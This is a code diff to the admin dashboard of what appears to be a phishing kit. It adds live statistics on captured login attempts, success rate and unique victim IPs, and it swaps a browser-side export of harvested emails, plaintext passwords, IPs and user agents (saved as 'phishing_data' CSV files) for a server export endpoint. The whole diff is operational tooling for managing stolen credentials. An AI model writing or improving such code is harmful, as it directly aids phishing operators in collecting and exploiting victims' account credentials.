@@ -182,35 +182,41 @@
         }, 2000);
       }
 
+      // Enhanced auto-refresh with API
+      async function refreshStats() {
+        try {
+          const response = await fetch("/api/stats");
+          if (response.ok) {
+            const stats = await response.json();
+
+            // Update stat cards
+            document.querySelector(
+              ".stat-card:nth-child(1) .stat-number"
+            ).textContent = stats.total_attempts;
+            document.querySelector(
+              ".stat-card:nth-child(2) .stat-number"
+            ).textContent = stats.success_rate + "%";
+            document.querySelector(
+              ".stat-card:nth-child(3) .stat-number"
+            ).textContent = stats.unique_ips;
+            document.querySelector(
+              ".stat-card:nth-child(4) .stat-number"
+            ).textContent = stats.today_attempts;
+          }
+        } catch (error) {
+          console.error("Error refreshing stats:", error);
+        }
+      }
+
+      // Update stats every 10 seconds, full page every 2 minutes
+      setInterval(refreshStats, 10000);
+      setInterval(() => {
+        window.location.reload();
+      }, 120000);
+
+      // Update export function to use server endpoint
       function exportData() {
-        const table = document.getElementById("dataTable");
-        let csv = "Email,Password,IP Address,Timestamp,User Agent\n";
-
-        const rows = table.querySelectorAll("tbody tr");
-        rows.forEach((row) => {
-          const cells = row.querySelectorAll("td");
-          const email = cells[0].textContent;
-          const password =
-            cells[1].querySelector(".password-visible").textContent;
-          const ip = cells[2].textContent;
-          const timestamp = cells[3].textContent;
-          const userAgent = cells[4].textContent;
-
-          csv += `"${email}","${password}","${ip}","${timestamp}","${userAgent}"\n`;
-        });
-
-        const blob = new Blob([csv], { type: "text/csv" });
-        const url = window.URL.createObjectURL(blob);
-        const a = document.createElement("a");
-        a.setAttribute("hidden", "");
-        a.setAttribute("href", url);
-        a.setAttribute(
-          "download",
-          `phishing_data_${new Date().toISOString().split("T")[0]}.csv`
-        );
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
+        window.location.href = "/admin/export";
       }
 
       // Auto-refresh data every 30 seconds
